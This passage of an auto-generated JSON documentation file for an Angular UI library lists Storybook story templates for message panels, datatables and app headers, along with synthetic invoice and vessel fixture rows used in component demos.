                    "type": "Story<StoMessagePanelComponent>",
                    "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    props: { dismiss: action('Dismissed') },\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" [dismissable]=\"true\">Dismissable Text Content</sto-message-panel>'\n  };\n}"
                },
                {
                    "name": "Primary",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                    "type": "Story<StoMessagePanelComponent>",
                    "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"primary\" [dismissable]=\"false\" icon=\"info\">Primary Text Content</sto-message-panel>'\n  };\n}"
                },
                {
                    "name": "Success",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                    "type": "Story<StoMessagePanelComponent>",
                    "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"success\" [dismissable]=\"false\" icon=\"info\">Warning Text Content</sto-message-panel>'\n  };\n}"
                },
                {
                    "name": "Template",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                    "type": "Story<>",
                    "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    component: StoMessagePanelComponent,\n    props: { ...args, dismissed: action('Dismissed') },\n    template: '<sto-message-panel [color]=\"color\" [dismissable]=\"dismissable\" [icon]=\"icon\" (dismissed)=\"dismissed()\">{{ contents }}</sto-message-panel>'\n  };\n}"
                },
                {
                    "name": "UsageWithInput",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                    "type": "",
                    "defaultValue": "Template.bind({})"
                },
                {
                    "name": "Warn",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                    "type": "Story<StoMessagePanelComponent>",
                    "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"warn\" [dismissable]=\"false\" icon=\"warning\">Warn Text Content</sto-message-panel>'\n  };\n}"
                },
                {
                    "name": "Warning",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                    "type": "Story<StoMessagePanelComponent>",
                    "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"warning\" [dismissable]=\"false\" icon=\"warning\">Warning Text Content</sto-message-panel>'\n  };\n}"
                }
            ],
            "libs/datatable/src/lib/datatable-custom.stories.ts": [
                {
                    "name": "Actionbar",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
                    "type": "Story<Partial<StoDatatableComponent<Record<string, unknown>>>>",
                    "defaultValue": "args => ( {\n  props: args,\n  template: `<h3>With an actionbar on the top left and right side</h3>\n<sto-datatable [virtualScroll]=\"true\" [scrollbarH]=\"true\" [autoSize]=\"true\" [footerRow]=\"footerRow\" [autoSizeOffset]=\"autoSizeOffset\" [height]=\"height\" [rows]=\"rows\" [columns]=\"columns\">\n  <sto-datatable-actions>\n      <sto-datatable-actions-left>\n        <button mat-icon-button><mat-icon>content_copy</mat-icon></button>\n        <button mat-icon-button><mat-icon>delete</mat-icon></button>\n       </sto-datatable-actions-left>\n      <sto-datatable-actions-right>\n        <button mat-icon-button><mat-icon>settings</mat-icon></button>\n      </sto-datatable-actions-right>\n  </sto-datatable-actions>\n</sto-datatable>`,\n} )"
                },
                {
                    "name": "AutoSize",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
                    "type": "Story",
                    "defaultValue": "(args) => ( {\n  props: args,\n  template: `<h3>Autosize will ensure the table always uses all available height top-down</h3>\n<sto-datatable [virtualScroll]=\"true\" [autoSize]=\"true\" [autoSizeOffset]=\"autosizeOffset\" [height]=\"height\" [rows]=\"rows\" [columns]=\"columns\">\n</sto-datatable>`,\n} )"
                },
                {
                    "name": "MultilineFooter",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
                    "type": "Story<Partial<StoDatatableComponent<Record<string, unknown>>>>",
                    "defaultValue": "args => ( {\n  props: args,\n  template: `<h3>The table takes in a list of footer rows</h3>\n<sto-datatable [virtualScroll]=\"true\" [scrollbarH]=\"true\" [autoSize]=\"true\" [footerRow]=\"footerRow\" [autoSizeOffset]=\"autoSizeOffset\" [height]=\"height\" [rows]=\"rows\" [columns]=\"columns\"></sto-datatable>`,\n} )"
                },
                {
                    "name": "Paging",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
                    "type": "Story",
                    "defaultValue": "(args) => ( {\n  props: args,\n  template: `\n<h3>Paging is done by using <a href=\"https://material.angular.io/components/paginator/overview\" target=\"_blank\">mat-paginator</a></h3>\n<mat-card class=\"sto-card\" (resize)=\"resize()\">\n<sto-datatable [virtualScroll]=\"false\" [height]=\"height\" [rows]=\"visibleRows\" [columns]=\"columns\">\n    <mat-paginator (page)=\"setPage($event, this); page($event)\" [showFirstLastButtons]=\"true\" [length]=\"rows.length\" [hidePageSize]=\"true\" [pageSize]=\"30\" [pageIndex]=\"activePage\"></mat-paginator>\n</sto-datatable>\n</mat-card>`\n} )"
                },
                {
                    "name": "ResponsiveMode",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
                    "type": "Story",
                    "defaultValue": "(args) => ( {\n  props: args,\n  template: `\n<h3>Responsive mode will make the grid break into a list, allowing for a simpler view</h3>\n<div [style.width.px]=\"emulateSmallElement ? breakpoint - 1 : 1000\">\n<sto-datatable [virtualScroll]=\"true\"\n[responsiveBreakPoint]=\"breakpoint\"\n[responsive]=\"true\"\n[responsiveView]=\"responsive\"\n[height]=\"400\"\n[rows]=\"rows\"\n[columns]=\"columns\"></sto-datatable>\n<ng-template #responsive let-row=\"row\">{{ row | json }}</ng-template>\n</div>`\n} )"
                }
            ],
            "libs/common/src/lib/sto-action-footer/action-footer.stories.ts": [
                {
                    "name": "ActionFooter",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/common/src/lib/sto-action-footer/action-footer.stories.ts",
                    "type": "",
                    "defaultValue": "Template.bind({})"
                },
                {
                    "name": "Template",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/common/src/lib/sto-action-footer/action-footer.stories.ts",
                    "type": "Story<StoActionFooterComponent>",
                    "defaultValue": "(args: StoActionFooterComponent) => {\n  return {\n    component: StoActionFooterComponent,\n    props: {\n      ...args,\n      save: action('Save'),\n      cancel: action('Cancel')\n    },\n    template: '<sto-action-footer [isLoading]=\"isLoading\" [position]=\"position\" [shouldAddClass]=\"shouldAddClass\"><button mat-flat-button (click)=\"save()\" color=\"primary\">Save</button><button (click)=\"cancel()\" mat-button>Cancel</button></sto-action-footer>'\n  };\n}"
                }
            ],
            "libs/core/src/lib/sto-directives/sto-grid.directive.ts": [
                {
                    "name": "ALL_GRIDS",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
                    "type": "[]",
                    "defaultValue": "[ 'sto-f-grid--1', 'sto-f-grid--2', 'sto-f-grid--4', 'sto-f-grid--6' ]"
                },
                {
                    "name": "getClass",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
                    "type": "",
                    "defaultValue": "(width: number, small = 400, large = 800) => {\n  let cols = 1;\n  if ( width > small ) {\n    cols += 1;\n  }\n  if ( width > large ) {\n    cols += 2;\n  }\n  return `sto-f-grid--${cols}`;\n}"
                }
            ],
            "libs/common/src/lib/sto-app-header/app-header.stories.ts": [
                {
                    "name": "AppHeader",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
                    "type": "",
                    "defaultValue": "Template.bind({})"
                },
                {
                    "name": "AsTestEnvironment",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
                    "type": "Story<StoAppHeaderComponent>",
                    "defaultValue": "(args: StoAppHeaderComponent) => {\n  return {\n    props: {\n      environmentName: 'Systemtest',\n      testEnvironment: true,\n      ...args\n    },\n    template: `<sto-app-header [breadCrumbs]=\"[ { label: 'Root' }, { label: 'SubModule' } ]\" [environmentName]=\"environmentName\" [testEnvironment]=\"true\"></sto-app-header>`\n  };\n}"
                },
                {
                    "name": "Template",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
                    "type": "Story<>",
                    "defaultValue": "(args: StoAppHeaderComponent) => {\n  return {\n    props: args,\n    template: `<sto-app-header [breadCrumbs]=\"breadCrumbs\" [environmentName]=\"environmentName\" [testEnvironment]=\"testEnvironment\"></sto-app-header>`\n  };\n}"
                },
                {
                    "name": "WithUserMenu",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
                    "type": "Story<StoAppHeaderComponent>",
                    "defaultValue": "(args: StoAppHeaderComponent) => {\n  return {\n    props: {\n      breadCrumbs: [\n        { label: 'Root', command: action('Root clicked'), segment: '' },\n        { label: 'SubModule', command: action('SubModule clicked'), segment: 'submodule' },\n        { label: 'Third level!', command: action('Third clicked'), segment: 'third' }\n      ],\n      environmentName: 'Systemtest',\n      homeConfig: { command: action('Home clicked') },\n      testEnvironment: true,\n      ...args\n    },\n    styles: [\n      '::ng-deep body .sto-header { left: 0; width: 100% !important; }'\n    ],\n    template: `\n<sto-app-header [userMenu]=\"menu\" [breadCrumbs]=\"breadCrumbs\" [homeBreadCrumbConfig]=\"homeConfig\">\n<button mat-icon-button><mat-icon>home</mat-icon></button>\n</sto-app-header>\n<mat-menu #menu=\"matMenu\"><button mat-menu-item><mat-icon>settings</mat-icon>User Name</button></mat-menu>\n`\n  };\n}"
                }
            ],
            "libs/common/src/test-utils.ts": [
                {
                    "name": "breadCrumbs",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/common/src/test-utils.ts",
                    "type": "Breadcrumb[]",
                    "defaultValue": "[\n  {\n    label: 'One',\n    command: () => {\n      console.log('Wat?');\n    },\n    segment: '1',\n  }, {\n    label: 'Two',\n    command: () => {\n    },\n    segment: '2',\n  },\n]"
                }
            ],
            "libs/common/src/lib/sto-message-panel/sto-message-panel.component.ts": [
                {
                    "name": "COLORS",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/common/src/lib/sto-message-panel/sto-message-panel.component.ts",
                    "type": "[]",
                    "defaultValue": "[\n  'primary', 'accent', 'warning', 'danger', 'success'\n]",
                    "description": "<p>Message panel to display inline info boxes.\nCan be of severity warning, error or info.</p>\n"
                }
            ],
            "libs/datatable/src/testing/utils.ts": [
                {
                    "name": "columns",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/datatable/src/testing/utils.ts",
                    "type": "Column[]",
                    "defaultValue": "[\n  { prop: 'invoiceNo', name: 'invoiceNo', },\n  { prop: 'voyageNo', name: 'voyageNo', },\n  { prop: 'vesselName', name: 'vesselName', },\n  { prop: 'allocated', name: 'allocated', },\n  { prop: 'total', name: 'total' },\n]"
                },
                {
                    "name": "rows",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/datatable/src/testing/utils.ts",
                    "type": "[]",
                    "defaultValue": "[\n  {\n    invoiceNo: 212666588,\n    voyageNo: 16206,\n    vesselName: 'False Cloak Fern',\n    allocated: 486958,\n    total: 367817\n  }, {\n    invoiceNo: 209381561,\n    voyageNo: 16897,\n    vesselName: 'Weak Signalgrass',\n    allocated: 435757,\n    total: 306822\n  }, {\n    invoiceNo: 276445387,\n    voyageNo: 16723,\n    vesselName: 'Southern Red Oak',\n    allocated: 434782,\n    total: 304761\n  }, {\n    invoiceNo: 240525031,\n    voyageNo: 17412,\n    vesselName: 'Hollyleaf Buckthorn',\n    allocated: 498118,\n    total: 518295\n  }, {\n    invoiceNo: 208251845,\n    voyageNo: 15732,\n    vesselName: 'Western Sandparsley',\n    allocated: 483548,\n    total: 409397\n  }, {\n    invoiceNo: 244864110,\n    voyageNo: 15313,\n    vesselName: 'Kern Buckwheat',\n    allocated: 413287,\n    total: 374936\n  }, {\n    invoiceNo: 213639557,\n    voyageNo: 17502,\n    vesselName: 'Greenleaf Manzanita',\n    allocated: 478124,\n    total: 362754\n  }, {\n    invoiceNo: 255930079,\n    voyageNo: 15029,\n    vesselName: 'Blue Skullcap',\n    allocated: 464448,\n    total: 483236\n  }, {\n    invoiceNo: 204028785,\n    voyageNo: 17325,\n    vesselName: 'Coca',\n    allocated: 412084,\n    total: 319574\n  }, {\n    invoiceNo: 215898267,\n    voyageNo: 17556,\n    vesselName: 'Fendler\\'s Pennycress',\n    allocated: 467666,\n    total: 401105\n  }, {\n    invoiceNo: 283652560,\n    voyageNo: 16693,\n    vesselName: 'Densespike Blazing Star',\n    allocated: 428117,\n    total: 422318\n  }, {\n    invoiceNo: 261627486,\n    voyageNo: 16742,\n    vesselName: 'Texas Crab Apple',\n    allocated: 445829,\n    total: 389401\n  }, {\n    invoiceNo: 224657257,\n    voyageNo: 17344,\n    vesselName: 'Philodendron',\n    allocated: 439503,\n    total: 197357\n  }, {\n    invoiceNo: 287799672,\n    voyageNo: 18559,\n    vesselName: 'Knife Acacia',\n    allocated: 457225,\n    total: 152586\n  }, {\n    invoiceNo: 249855102,\n    voyageNo: 17210,\n    vesselName: 'Catnip Noseburn',\n    allocated: 490793,\n    total: 295054\n  }, {\n    invoiceNo: 217932979,\n    voyageNo: 18294,\n    vesselName: 'Brickellbush Goldenweed',\n    allocated: 476987,\n    total: 90357\n  }, {\n    invoiceNo: 287187542,\n    voyageNo: 18123,\n    vesselName: 'Threecornerjack',\n    allocated: 436103,\n    total: 98431\n  }, {\n    invoiceNo: 277359566,\n    voyageNo: 17549,\n    vesselName: 'Longleaf Isodendrion',\n    allocated: 456456,\n    total: 292117\n  }, {\n    invoiceNo: 250935681,\n    voyageNo: 16429,\n    vesselName: 'Purple False Gilyflower',\n    allocated: 465653,\n    total: 396830\n  }, {\n    invoiceNo: 261927204,\n    voyageNo: 16524,\n    vesselName: 'Nevada Pea',\n    allocated: 411190,\n    total: 393332\n  }, {\n    invoiceNo: 203826163,\n    voyageNo: 17608,\n    vesselName: 'Alaska Tall Bluebells',\n    allocated: 487745,\n    total: 273514\n  }, {\n    invoiceNo: 253006185,\n    voyageNo: 17795,\n    vesselName: 'Cupped Monolopia',\n    allocated: 491265,\n    total: 117277\n  }, {\n    invoiceNo: 212369622,\n    voyageNo: 17867,\n    vesselName: 'Small Rocklettuce',\n    allocated: 408880,\n    total: 530690\n  }, {\n    invoiceNo: 259555515,\n    voyageNo: 16488,\n    vesselName: 'Torchwood',\n    allocated: 428843,\n    total: 63208\n  }, {\n    invoiceNo: 209064476,\n    voyageNo: 17957,\n    vesselName: 'Saline Saltbush',\n    allocated: 452602,\n    total: 144560\n  }, {\n    invoiceNo: 246761266,\n    voyageNo: 18253,\n    vesselName: 'White Snakeroot',\n    allocated: 485075,\n    total: 133101\n  }, {\n    invoiceNo: 277989052,\n    voyageNo: 15535,\n    vesselName: 'Bayberry',\n    allocated: 411595,\n    total: 549473\n  }, {\n    invoiceNo: 246327302,\n    voyageNo: 17427,\n    vesselName: 'China Violet',\n    allocated: 426753,\n    total: 406017\n  }, {\n    invoiceNo: 225951335,\n    voyageNo: 15473,\n    vesselName: 'Olympic Saxifrage',\n    allocated: 429650,\n    total: 413380\n  }, {\n    invoiceNo: 206579573,\n    voyageNo: 17600,\n    vesselName: 'False Sun-rose',\n    allocated: 464983,\n    total: 474611\n  }, {\n    invoiceNo: 243806520,\n    voyageNo: 15148,\n    vesselName: 'Bracted Lousewort',\n    allocated: 486907,\n    total: 419416\n  }, {\n    invoiceNo: 248037555,\n    voyageNo: 16554,\n    vesselName: 'Beach Strawberry',\n    allocated: 446762,\n    total: 543982\n  }, {\n    invoiceNo: 233807782,\n    voyageNo: 18251,\n    vesselName: 'Western Bog Yellowcress',\n    allocated: 485749,\n    total: 206612\n  }, {\n    invoiceNo: 231399318,\n    voyageNo: 18647,\n    vesselName: 'Nevada Pea',\n    allocated: 416624,\n    total: 73797\n  }, {\n    invoiceNo: 210265421,\n    voyageNo: 17334,\n    vesselName: 'Silver Bird\\'s-foot Trefoil',\n    allocated: 493556,\n    total: 485404\n  }, {\n    invoiceNo: 270110020,\n    voyageNo: 15750,\n    vesselName: 'Dotted Lancepod',\n    allocated: 439009,\n    total: 85163\n  }, {\n    invoiceNo: 203365491,\n    voyageNo: 15574,\n    vesselName: 'Arizona Whitefeather',\n    allocated: 424981,\n    total: 72976\n  }, {\n    invoiceNo: 258026382,\n    voyageNo: 17991,\n    vesselName: 'Rough Blackfoot',\n    allocated: 412805,\n    total: 525915\n  }, {\n    invoiceNo: 216800989,\n    voyageNo: 18938,\n    vesselName: 'Narrowleaf Wirelettuce',\n    allocated: 437679,\n    total: 384426\n  }, {\n    invoiceNo: 224161270,\n    voyageNo: 15475,\n    vesselName: 'Utah Sweetvetch',\n    allocated: 414735,\n    total: 398700\n  }, {\n    invoiceNo: 224587536,\n    voyageNo: 16133,\n    vesselName: 'Palau Horsfieldia',\n    allocated: 409836,\n    total: 55599\n  }, {\n    invoiceNo: 200019644,\n    voyageNo: 16430,\n    vesselName: 'Cracked Lichen',\n    allocated: 491135,\n    total: 400179\n  }, {\n    invoiceNo: 212973644,\n    voyageNo: 16527,\n    vesselName: 'California Valerian',\n    allocated: 465742,\n    total: 428281\n  }, {\n    invoiceNo: 236726871,\n    voyageNo: 15145,\n    vesselName: 'Spear Saltbush',\n    allocated: 420067,\n    total: 236753\n  }, {\n    invoiceNo: 262498296,\n    voyageNo: 16350,\n    vesselName: 'Rose Globemallow',\n    allocated: 472387,\n    total: 270655\n  }, {\n    invoiceNo: 237959767,\n    voyageNo: 18739,\n    vesselName: 'Cithara Buckwheat',\n    allocated: 447466,\n    total: 358262\n  }, {\n    invoiceNo: 200461954,\n    voyageNo: 18921,\n    vesselName: 'Rough Potato',\n    allocated: 425594,\n    total: 459497\n  }, {\n    invoiceNo: 266033549,\n    voyageNo: 16150,\n    vesselName: 'Distictis',\n    allocated: 447636,\n    total: 286350\n  }, {\n    invoiceNo: 289893009,\n    voyageNo: 18219,\n    vesselName: 'Piedmont False Pimpernel',\n    allocated: 474098,\n    total: 163688\n  }, {\n    invoiceNo: 241320630,\n    voyageNo: 15558,\n    vesselName: 'Southern Mexican Sage',\n    allocated: 431537,\n    total: 419734\n  }, {\n    invoiceNo: 211404482,\n    voyageNo: 18502,\n    vesselName: 'Bearded Sprangletop',\n    allocated: 458939,\n    total: 89714\n  }, {\n    invoiceNo: 247917426,\n    voyageNo: 18238,\n    vesselName: 'Small-flowered Calycadenia',\n    allocated: 406198,\n    total: 351785\n  }, {\n    invoiceNo: 234633032,\n    voyageNo: 17269,\n    vesselName: 'Pritchardia',\n    allocated: 442188,\n    total: 414638\n  }, {\n    invoiceNo: 216477974,\n    voyageNo: 15454,\n    vesselName: 'Thread Lichen',\n    allocated: 474232,\n    total: 537142\n  }, {\n    invoiceNo: 201667786,\n    voyageNo: 15130,\n    vesselName: 'Margined Stickseed',\n    allocated: 493253,\n    total: 364145\n  }, {\n    invoiceNo: 271891491,\n    voyageNo: 15468,\n    vesselName: 'Eggleaf Milkwort',\n    allocated: 457747,\n    total: 316780\n  }, {\n    invoiceNo: 223744528,\n    voyageNo: 16074,\n    vesselName: 'Hall\\'s Mule-ears',\n    allocated: 439241,\n    total: 301239\n  }, {\n    invoiceNo: 202936481,\n    voyageNo: 18868,\n    vesselName: 'Rinodina Lichen',\n    allocated: 488291,\n    total: 504547\n  }, {\n    invoiceNo: 284610720,\n    voyageNo: 17077,\n    vesselName: 'Saber Bogmat',\n    allocated: 417817,\n    total: 246511\n  }, {\n    invoiceNo: 286535852,\n    voyageNo: 15935,\n    vesselName: 'Brodiaea',\n    allocated: 479989,\n    total: 276206\n  }, {\n    invoiceNo: 206000446,\n    voyageNo: 17528,\n    vesselName: 'Utah Serviceberry',\n    allocated: 454837,\n    total: 399887\n  }, {\n    invoiceNo: 283036494,\n    voyageNo: 16899,\n    vesselName: 'Lehua Makanoe',\n    allocated: 452547,\n    total: 96023\n  }, {\n    invoiceNo: 270371913,\n    voyageNo: 16886,\n    vesselName: 'Rim Lichen',\n    allocated: 439082,\n    total: 269557\n  }, {\n    invoiceNo: 273513209,\n    voyageNo: 15570,\n    vesselName: 'Andrews\\' Rhizomnium Moss',\n    allocated: 471494,\n    total: 131750\n  }, {\n    invoiceNo: 215244773,\n    voyageNo: 17618,\n    vesselName: 'Lesser Pond Sedge',\n    allocated: 472422,\n    total: 505921\n  }, {\n    invoiceNo: 264815411,\n    voyageNo: 17008,\n    vesselName: 'Browne\\'s Savory',\n    allocated: 464834,\n    total: 420180\n  }, {\n    invoiceNo: 260793904,\n    voyageNo: 18868,\n    vesselName: 'Bastard Copperleaf',\n    allocated: 403983,\n    total: 190831\n  }, {\n    invoiceNo: 228919503,\n    voyageNo: 16736,\n    vesselName: 'Himalayan Cypress',\n    allocated: 418664,\n    total: 450233\n  }, {\n    invoiceNo: 225534860,\n    voyageNo: 18374,\n    vesselName: 'Fiddleleaf Hawksbeard',\n    allocated: 495477,\n    total: 528500\n  }, {\n    invoiceNo: 205039289,\n    voyageNo: 15221,\n    vesselName: 'Maui Cyanea',\n    allocated: 434081,\n    total: 79021\n  }, {\n    invoiceNo: 219730920,\n    voyageNo: 18931,\n    vesselName: 'Garden Sorrel',\n    allocated: 442584,\n    total: 193166\n  }, {\n    invoiceNo: 229994865,\n    voyageNo: 16404,\n    vesselName: 'Waialeale Dubautia',\n    allocated: 414377,\n    total: 195495\n  }, {\n    invoiceNo: 289807557,\n    voyageNo: 16151,\n    vesselName: 'Onetooth Woodfern',\n    allocated: 415673,\n    total: 202974\n  }, {\n    invoiceNo: 289750833,\n    voyageNo: 15827,\n    vesselName: 'Greenland Orange Lichen',\n    allocated: 416432,\n    total: 146021\n  }, {\n    invoiceNo: 243948439,\n    voyageNo: 18154,\n    vesselName: 'Leafy Reedgrass',\n    allocated: 441439,\n    total: 248631\n  }, {\n    invoiceNo: 266718010,\n    voyageNo: 15322,\n    vesselName: 'Largeleaf Marshpennywort',\n    allocated: 436736,\n    total: 256997\n  }, {\n    invoiceNo: 285338933,\n    voyageNo: 18884,\n    vesselName: 'Musk Okra',\n    allocated: 414918,\n    total: 475276\n  }, {\n    invoiceNo: 284544908,\n    voyageNo: 16825,\n    vesselName: 'Stegonia Moss',\n    allocated: 486396,\n    total: 210718\n  }, {\n    invoiceNo: 200951860,\n    voyageNo: 15681,\n    vesselName: 'Black Rock Townsend Daisy',\n    allocated: 437133,\n    total: 358340\n  }, {\n    invoiceNo: 248838992,\n    voyageNo: 18254,\n    vesselName: 'Kern Canyon Clarkia',\n    allocated: 414245,\n    total: 164454\n  }, {\n    invoiceNo: 274109340,\n    voyageNo: 18252,\n    vesselName: 'Squarrose Knapweed',\n    allocated: 408814,\n    total: 159690\n  }, {\n    invoiceNo: 219721177,\n    voyageNo: 16331,\n    vesselName: 'Lake County Dwarf-flax',\n    allocated: 496150,\n    total: 404922\n  }, {\n    invoiceNo: 272212685,\n    voyageNo: 15395,\n    vesselName: 'Ferngrass',\n    allocated: 432853,\n    total: 191127\n  }, {\n    invoiceNo: 243182762,\n    voyageNo: 18321,\n    vesselName: 'Marsh Grass',\n    allocated: 462472,\n    total: 452940\n  }, {\n    invoiceNo: 277839539,\n    voyageNo: 17421,\n    vesselName: 'Prairie Straw Sedge',\n    allocated: 406837,\n    total: 271284\n  }, {\n    invoiceNo: 207952597,\n    voyageNo: 17197,\n    vesselName: 'Doublehorn Calicoflower',\n    allocated: 477735,\n    total: 400959\n  }, {\n    invoiceNo: 260636315,\n    voyageNo: 15453,\n    vesselName: 'Palmer\\'s Goldenrod',\n    allocated: 450419,\n    total: 309897\n  }, {\n    invoiceNo: 256449906,\n    voyageNo: 15189,\n    vesselName: 'Oregon Checkerbloom',\n    allocated: 435139,\n    total: 139814\n  }, {\n    invoiceNo: 230023430,\n    voyageNo: 15665,\n    vesselName: 'Duckweed',\n    allocated: 449282,\n    total: 209512\n  }, {\n    invoiceNo: 226217229,\n    voyageNo: 18462,\n    vesselName: 'Disc Lichen',\n    allocated: 471214,\n    total: 58962\n  }, {\n    invoiceNo: 239201753,\n    voyageNo: 18676,\n    vesselName: 'Antifever Fontinalis Moss',\n    allocated: 456585,\n    total: 146024\n  }, {\n    invoiceNo: 235303844,\n    voyageNo: 16223,\n    vesselName: 'Miracle Fruit',\n    allocated: 467877,\n    total: 150931\n  }, {\n    invoiceNo: 217943418,\n    voyageNo: 15418,\n    vesselName: 'Little Gumweed',\n    allocated: 494402,\n    total: 355363\n  }, {\n    invoiceNo: 289788898,\n    voyageNo: 15038,\n    vesselName: 'Parish\\'s Oxytheca',\n    allocated: 464853,\n    total: 472823\n  }, {\n    invoiceNo: 280499130,\n    voyageNo: 18914,\n    vesselName: 'Jelly Lichen',\n    allocated: 486477,\n    total: 522679\n  }, {\n    invoiceNo: 223812339,\n    voyageNo: 18298,\n    vesselName: 'Evermann\\'s Fleabane',\n    allocated: 453418,\n    total: 50034\n  }, {\n    invoiceNo: 226331833,\n    voyageNo: 17046,\n    vesselName: 'Munj Sweetcane',\n    allocated: 442239,\n    total: 447072\n  }, {\n    invoiceNo: 226842057,\n    voyageNo: 16491,\n    vesselName: 'Trichostomum Moss',\n    allocated: 450732,\n    total: 471203\n  }, {\n    invoiceNo: 218377093,\n    voyageNo: 18157,\n    vesselName: 'Brown Stringybark',\n    allocated: 441668,\n    total: 464837\n  }, {\n    invoiceNo: 282690677,\n    voyageNo: 16864,\n    vesselName: 'Whorled Milkwort',\n    allocated: 424456,\n    total: 241177\n  } ]"
                }
            ],
            "libs/datatable/src/lib/rows.ts": [
                {
                    "name": "columns",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/datatable/src/lib/rows.ts",
                    "type": "[]",
                    "defaultValue": "[\n  {\n    prop: 'invoiceNo',\n    name: 'Invoice# (randsort)',\n    flexBasis: 200,\n    flexShrink: 1,\n    flexGrow: 1,\n    // random sort\n    sortFn: () => {\n      let n = Math.round(Math.random() * 1000);\n      if (n < 500) {\n        n = -n;\n      }\n      return n;\n    }\n  },\n  {\n    prop: 'voyageNo',\n    flexBasis: 200,\n    disableResize: true,\n    name: 'Voyage# (no resize)',\n    disableSort: true,\n    headerClass: 'aclass',\n    cellClass: () => {\n      return 'a-cell-class';\n    }\n  },\n  {\n    prop: 'vesselName',\n    flexBasis: 200,\n    name: 'Vessel',\n    headerClass: 'bclass',\n    flexGrow: 1\n  },\n  {\n    prop: 'allocated',\n    flexBasis: 200,\n    name: 'Allocated',\n    headerClass: 'aclass'\n  },\n  {\n    prop: 'total',\n    flexBasis: 200,\n    name: 'Total',\n    headerClass: 'aclass',\n    cellClass: 'a-cell-class'\n  }\n]"
                },
                {
                    "name": "fixedColumns",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/datatable/src/lib/rows.ts",
                    "type": "[]",
                    "defaultValue": "[...columns.map(col => ({...col, flexGrow: 0})), ...columns.map(col => ({\n  ...col,\n  flexGrow: 0\n}))]"
                },
                {
                    "name": "manyColumns",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/datatable/src/lib/rows.ts",
                    "type": "[]",
                    "defaultValue": "[...columns, ...columns, ...columns]"
                },
                {
                    "name": "pipe",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/datatable/src/lib/rows.ts",
                    "type": "",
                    "defaultValue": "new NumberFormatPipe()"
                },
                {
                    "name": "rows",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/datatable/src/lib/rows.ts",
                    "type": "",
                    "defaultValue": "[\n  {\n    'invoiceNo': 212666588,\n    'voyageNo': 16206,\n    'vesselName': 'False Cloak Fern',\n    'allocated': 486958,\n    'total': 367817\n}, {\n    'invoiceNo': 209381561,\n    'voyageNo': 16897,\n    'vesselName': 'Weak Signalgrass',\n    'allocated': 435757,\n    'total': 306822\n}, {\n    'invoiceNo': 276445387,\n    'voyageNo': 16723,\n    'vesselName': 'Southern Red Oak',\n    'allocated': 434782,\n    'total': 304761\n}, {\n    'invoiceNo': 240525031,\n    'voyageNo': 17412,\n    'vesselName': 'Hollyleaf Buckthorn',\n    'allocated': 498118,\n    'total': 518295\n}, {\n    'invoiceNo': 208251845,\n    'voyageNo': 15732,\n    'vesselName': 'Western Sandparsley',\n    'allocated': 483548,\n    'total': 409397\n}, {\n    'invoiceNo': 244864110,\n    'voyageNo': 15313,\n    'vesselName': 'Kern Buckwheat',\n    'allocated': 413287,\n    'total': 374936\n}, {\n    'invoiceNo': 213639557,\n    'voyageNo': 17502,\n    'vesselName': 'Greenleaf Manzanita',\n    'allocated': 478124,\n    'total': 362754\n}, {\n    'invoiceNo': 255930079,\n    'voyageNo': 15029,\n    'vesselName': 'Blue 